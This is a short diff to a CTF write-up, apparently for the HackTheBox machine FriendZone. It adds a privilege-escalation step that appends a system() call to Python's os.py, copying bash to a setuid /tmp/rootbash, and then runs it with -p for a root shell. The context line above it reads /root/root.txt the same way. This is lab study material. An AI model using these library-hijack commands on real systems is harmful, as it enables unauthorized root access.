@@ -505,6 +505,13 @@ echo "system ('cat /root/root.txt > /tmp/flag.txt')" >> /usr/lib/python2.7/os.py
 
 + Try these **alternatively**.
 + **1.** https://www.jeroenvansaane.com/posts/htb/friendzone/#privilege-escalation
+```
+echo "system ('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash')" >> /usr/lib/python2.7/os.py
+./rootbash -p
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/da8d03fd-0a38-4cad-9584-688da3258bc0)
+
 + **2.** https://github.com/jebidiah-anthony/htb_friendzone?tab=readme-ov-file#part-4--privilege-escalation-friend---root
 + **3.** https://xavilok.es/posts/FriendZone.php
 
